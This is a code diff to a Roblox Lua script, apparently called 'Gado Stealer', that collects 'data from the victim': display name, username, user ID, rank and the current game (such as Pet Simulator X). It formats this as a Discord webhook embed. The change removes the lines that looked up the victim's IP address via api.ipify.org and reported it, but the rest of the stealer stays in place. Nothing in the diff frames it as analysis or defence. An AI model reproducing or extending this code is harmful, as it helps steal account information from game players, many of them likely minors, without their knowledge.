@@ -1,4 +1,4 @@
-local ip = tostring(game:HttpGet("https://api.ipify.org", true))
+
 if game.PlaceId == 6284583030 then
 	_G.GameIn = "Pet Simulator X"
 elseif game.PlaceId == 7722306047 then
@@ -24,7 +24,7 @@ local msg = {
   ["embeds"]= {
     {
       ["title"]= "`Gado Stealer results`",
-      ["description"]= "**Data from the victim**\n🧑Display Name: ".._G.PlrDisplayNameVictim.."\n🧑Username: ".._G.PlrUserVictim.."\n🧑User ID: ".._G.PlrUserIDVictim.."\n🐱Rank: ".._G.CurrentRank.."\n🎮Place: ".._G.GameIn.."\nIP: "..ip.."",
+      ["description"]= "**Data from the victim**\n🧑Display Name: ".._G.PlrDisplayNameVictim.."\n🧑Username: ".._G.PlrUserVictim.."\n🧑User ID: ".._G.PlrUserIDVictim.."\n🐱Rank: ".._G.CurrentRank.."\n🎮Place: ".._G.GameIn.."",
       ["url"]= "https://discord.gg/nqny2McnjK",
       ["color"]= ""..webhookcolor.."",
       ["fields"]= {
